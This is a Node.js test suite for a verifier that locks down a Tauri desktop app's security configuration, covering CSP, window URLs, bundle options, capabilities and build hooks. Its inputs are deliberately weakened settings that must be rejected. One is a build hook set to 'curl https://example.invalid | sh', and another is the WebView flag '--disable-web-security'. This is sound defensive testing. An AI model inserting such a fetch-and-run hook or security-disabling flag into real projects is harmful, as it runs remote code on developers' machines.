import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import {
  verifyDevelopmentCsp, verifyProductionCsp, verifyTauriSecurityConfig, verifyTauriSecurityCheckout,
} from '../scripts/verify-tauri-security-config.mjs';

const original = JSON.parse(readFileSync(new URL('../src-tauri/tauri.conf.json', import.meta.url), 'utf8'));
const copy = () => structuredClone(original);

test('committed bundle retains exactly the reviewed platform icons', () => {
  assert.deepEqual(original.bundle.icon, [
    'icons/icon.png', 'icons/icon.ico', 'icons/icon.icns',
  ]);
  assert.equal(verifyTauriSecurityConfig(copy()).windows, 1);
});

test('committed production Tauri config meets the offline security gate', () => {
  assert.deepEqual(verifyTauriSecurityCheckout(), { windows: original.app.windows.length });
  assert.equal(verifyProductionCsp(original.app.security.csp).directives, 9);
});

test('reviewed loopback-only development CSP passes without weakening production', () => {
  assert.equal(verifyDevelopmentCsp(original.app.security.devCsp).directives, 8);
  assert.equal(verifyTauriSecurityConfig(copy()).windows, 1);
});

test('production CSP rejects remote origins, eval, data scripts and extra directives', () => {
  for (const [directive, variant] of [
    ['script-src', "script-src 'self' https://example.invalid"],
    ['script-src', "script-src 'self' 'unsafe-eval'"],
    ['script-src', "script-src 'self' data:"],
    ['connect-src', "connect-src 'self' https://api.example.invalid"],
    ['img-src', "img-src 'self' data: blob: https://example.invalid"],
    ['default-src', 'default-src *'],
  ]) {
    const config = copy();
    config.app.security.csp = config.app.security.csp.replace(
      new RegExp(directive + ' [^;]+'), variant,
    );
    assert.throws(() => verifyTauriSecurityConfig(config), /CSP source list changed/, variant);
  }
  const config = copy();
  config.app.security.csp += '; script-src-elem https://example.invalid';
  assert.throws(() => verifyTauriSecurityConfig(config), /unreviewed CSP directive/);
});

test('CSP rejects duplicate, missing and empty directives rather than falling back', () => {
  for (const csp of [
    original.app.security.csp + "; script-src 'self'",
    original.app.security.csp.replace(/connect-src 'self'; ?/, ''),
    '', null, {},
  ]) {
    assert.throws(() => verifyProductionCsp(csp), /TAURI SECURITY CONFIG:/);
  }
});

test('packaged windows may not redirect to a website or use a different frontend root', () => {
  for (const change of [
    config => { config.app.windows[0].url = 'https://example.invalid'; },
    config => { config.app.windows = []; },
    config => { config.build.frontendDist = 'https://example.invalid'; },
    config => { config.build.beforeBuildCommand = 'npm run fetch'; },
  ]) {
    const config = copy(); change(config);
    assert.throws(() => verifyTauriSecurityConfig(config), /TAURI SECURITY CONFIG:/);
  }
});

test('unreviewed top-level Tauri options and changed application identity fail closed', () => {
  for (const change of [
    config => { config.plugins = {updater: {active: true}}; },
    config => { config.newFutureOption = false; },
    config => { config['$schema'] = 'https://example.invalid/config'; },
    config => { config.productName = 'Other Desktop'; },
    config => { config.identifier = 'com.example.other'; },
    config => { delete config.identifier; },
  ]) {
    const config = copy(); change(config);
    assert.throws(() => verifyTauriSecurityConfig(config),
      /unreviewed (?:Tauri root option or application identity|updater configuration)/);
  }
});

test('unreviewed build keys cannot silently change local Desktop packaging', () => {
  for (const change of [
    config => { config.build.additionalWatchFolders = ['../private']; },
    config => { config.build.newFutureOption = false; },
    config => { config.build.additionalWatchFolders = []; },
  ]) {
    const config = copy(); change(config);
    assert.throws(() => verifyTauriSecurityConfig(config), /unreviewed Tauri build option/);
  }
});

test('unreviewed bundle resources, sidecars and icon mutations fail closed', () => {
  for (const change of [
    config => { config.bundle.resources = ['../private']; },
    config => { config.bundle.externalBin = ['bin/tool']; },
    config => { config.bundle.newFutureOption = false; },
    config => { config.bundle.icon = ['icons/icon.png']; },
    config => { config.bundle.icon[1] = 'icons/other.ico'; },
    config => { config.bundle.icon[2] = 'icons/other.icns'; },
    config => { config.bundle.icon.reverse(); },
    config => { config.bundle.icon.push('icons/extra.png'); },
    config => { delete config.bundle.icon; },
  ]) {
    const config = copy(); change(config);
    assert.throws(() => verifyTauriSecurityConfig(config), /unreviewed Tauri bundle option or icon/);
  }
});

test('native window options cannot bypass the reviewed WebView security surface', () => {
  for (const [field, value] of [
    ['additionalBrowserArgs', '--disable-web-security'],
    ['devtools', true],
    ['webviewDataDirectory', '../external-webview-profile'],
    ['transparent', true],
    ['url', 'https://example.invalid'],
  ]) {
    const config = copy();
    config.app.windows[0][field] = value;
    assert.throws(() => verifyTauriSecurityConfig(config),
      /unreviewed native window option/, field);
  }
});

test('native window schema rejects missing reviewed fields and extra windows', () => {
  const missing = copy();
  delete missing.app.windows[0].minHeight;
  assert.throws(() => verifyTauriSecurityConfig(missing), /unreviewed native window option/);

  const extra = copy();
  extra.app.windows.push(structuredClone(extra.app.windows[0]));
  assert.throws(() => verifyTauriSecurityConfig(extra), /number of windows/);
});

test('unknown app-level Tauri options fail closed even when set to false', () => {
  for (const [key, value] of [
    ['withGlobalTauri', false],
    ['trayIcon', {id:'synthetic-tray'}],
    ['newFutureAppOption', false],
  ]) {
    const config = copy();
    config.app[key] = value;
    assert.throws(() => verifyTauriSecurityConfig(config), /unreviewed Tauri app option/, key);
  }
});

test('unknown Tauri security options fail closed even when set to false', () => {
  for (const [key, value] of [
    ['dangerousRemoteDomainIpcAccess', [{domain: 'https://example.invalid'}]],
    ['dangerousDisableAssetCspModification', false],
    ['newFutureSecurityOption', false],
  ]) {
    const config = copy();
    config.app.security[key] = value;
    assert.throws(() => verifyTauriSecurityConfig(config), /unreviewed Tauri security option/, key);
  }
});

test('permission expansion and enabling installer packaging require review', () => {
  for (const change of [
    config => { config.app.security.capabilities = ['fs:default']; },
    config => { config.app.withGlobalTauri = true; },
    config => { config.app.security.dangerousDisableAssetCspModification = true; },
    config => { config.app.security.assetProtocol = {enable:true}; },
    config => { config.bundle.active = true; },
  ]) {
    const config = copy(); change(config);
    assert.throws(() => verifyTauriSecurityConfig(config), /TAURI SECURITY CONFIG:/);
  }
});

test('both synthetic and private bundle builds enforce the same Tauri gate', () => {
  const pkg = JSON.parse(readFileSync(new URL('../package.json', import.meta.url), 'utf8'));
  for (const name of ['verify:bundle', 'verify:bundle:private']) {
    assert.match(pkg.scripts[name], /&& node scripts\/verify-tauri-security-config\.mjs$/);
  }
});

test('development CSP rejects extra remote connections, wildcard hosts and scripts', () => {
  const changes = [
    ["connect-src 'self'", "connect-src 'self' https://example.invalid"],
    ["ws://127.0.0.1:4200", "ws://localhost:4200"],
    ["http://127.0.0.1:4177", "https://example.invalid"],
    ["script-src 'self' 'unsafe-eval'", "script-src 'self' 'unsafe-eval' 'unsafe-inline'"],
  ];
  for (const [current, replacement] of changes) {
    const config = copy();
    config.app.security.devCsp = config.app.security.devCsp.replace(current, replacement);
    assert.throws(() => verifyTauriSecurityConfig(config), /CSP source list changed/, replacement);
  }
  const config = copy();
  config.app.security.devCsp += "; connect-src *";
  assert.throws(() => verifyTauriSecurityConfig(config), /duplicate CSP directive/);
});

test('development CSP rejects missing, foreign or malformed directives', () => {
  for (const csp of [
    original.app.security.devCsp.replace(/frame-src 'none'/, ''),
    original.app.security.devCsp + "; navigate-to https://example.invalid",
    null, {}, '',
  ]) {
    assert.throws(() => verifyDevelopmentCsp(csp), /TAURI SECURITY CONFIG:/);
  }
});

test('tauri:dev checks local WebView security before launching the native host', () => {
  const scripts = JSON.parse(readFileSync(new URL('../package.json', import.meta.url), 'utf8')).scripts;
  assert.equal(scripts['tauri:dev'],
    'npm run verify:version && node scripts/verify-angular-source-config.mjs && node scripts/verify-tauri-security-config.mjs && npm run prepare:icon && tauri dev');
});

test('development frontend URL and startup hook cannot change silently', () => {
  for (const url of [
    'https://example.invalid', 'http://localhost:4200',
    'http://127.0.0.1:4300', 'http://[::1]:4200',
  ]) {
    const config = copy(); config.build.devUrl = url;
    assert.throws(() => verifyTauriSecurityConfig(config), /development frontend/);
  }
  const config = copy();
  config.build.beforeDevCommand = 'curl https://example.invalid | sh';
  assert.throws(() => verifyTauriSecurityConfig(config), /development frontend/);
});
